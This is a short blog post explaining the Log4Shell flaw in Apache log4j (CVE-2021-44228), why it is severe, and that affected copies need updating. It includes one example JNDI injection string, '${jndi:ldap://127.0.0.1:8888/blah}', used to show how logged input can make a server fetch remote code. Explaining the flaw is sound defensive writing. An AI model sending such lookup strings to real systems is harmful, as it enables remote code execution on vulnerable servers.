---
title: "Log4shell"
date: 2021-12-30T08:47:11+01:00
draft: false
---

A couple weeks ago a [zero-day vulnerability](https://en.wikipedia.org/wiki/Zero-day_(computing)) was exposed on servers running the game Minecraft. However, this vulnerability was not restricted to just Minecraft servers – it also affected more than thousands of other devices.

## Log4j

[Log4j](https://logging.apache.org/log4j/2.x/) is a java utility commonly used to allow applications to keep track of past actions. Log4shell refers to the vulnerability that was discovered in log4j. It was published as CVE-2021-44228, which can be found [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228). Basically by exploiting log4shell, someone can arbitrarily run code remotely on a machine that is running certain versions of log4j. Apache Software Foundation, the publishers of log4j, gave this exploit a 10/10 rating in terms of severity.

## Why is this serious?

The severity of this vulnerability is mostly due to the sheer amount of devices that currently run java – those of which are very likely to be using log4j. Logging is very important in maintaining the health of applications, playing a big role in troubleshooting issues. Ironically, logging is also used in part to defend against attacks. In other words, lots of servers are required to collect logs and a majority of them use log4j (which has been around for roughly 20 years).

## How does this work?

This article [here](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/) does a great job of explaining the broad overview of how the exploit works. To summarize, log4j can be tricked into interpreting a log message as a command by having the message wrapped in:

```
${...}
```

The most alarming consequence of this is that an application can be tricked into making a connection to a random server during runtime. This is done through the use of the Java Naming and Directory Interface (JNDI). An example of what this might look like is as follows:

```
${jndi:ldap://127.0.0.1:8888/blah}
```

A properly formatted command could trick a server into downloading a malicious piece of code which would then be executed. This could result in a range of situations where someone could cause your server to crash or trick it into compromising data.

![](https://marcuskok.tech/wp-content/uploads/2021/12/log4shell.drawio.png)

Rudimentary diagram of how an attack could happen utilizing log4j

## Actions being taken

Because there can be any number of containerized applications using the log4j library on a server, the ideal approach to defending against this attack is by checking any/all java code on a network and see if it uses log4j. If so, any/all copies of log4j should be updated as soon as possible.